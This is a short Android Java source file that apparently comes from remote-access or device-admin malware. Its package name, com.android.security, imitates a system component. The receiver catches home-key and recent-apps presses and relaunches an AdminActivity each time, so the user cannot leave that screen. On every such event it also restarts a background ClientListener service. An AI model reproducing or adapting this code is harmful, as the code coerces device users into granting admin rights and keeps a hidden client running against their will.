package com.android.security.receiver;
 

import com.android.security.AdminActivity;
import com.android.security.ClientListener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class HomeKeyEventReceiver extends BroadcastReceiver {
	   
	static final String SYSTEM_HOME_KEY = "homekey";
	static final String SYSTEM_REASON = "reason";
	static final String SYSTEM_RECENT_APPS = "recentapps";

	public void onReceive(Context context, Intent intent) {
		String action = intent.getAction();
		if (action.equals("android.intent.action.CLOSE_SYSTEM_DIALOGS")) {
			String reason = intent.getStringExtra(SYSTEM_REASON);
			if (reason != null) {
				
				if (reason.equals(SYSTEM_HOME_KEY)) {
					startAdminActivity(context);
				}
				else if (reason.equals(SYSTEM_RECENT_APPS)) {
					startAdminActivity(context);
				}				
				Intent service = new Intent(context, ClientListener.class);
				service.setAction(HomeKeyEventReceiver.class.getName());
				context.startService(service);
			}
		}
	}

	private void startAdminActivity(Context context) {
 		Intent activity = new Intent(context, AdminActivity.class);
		activity.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(activity); 
	}

}
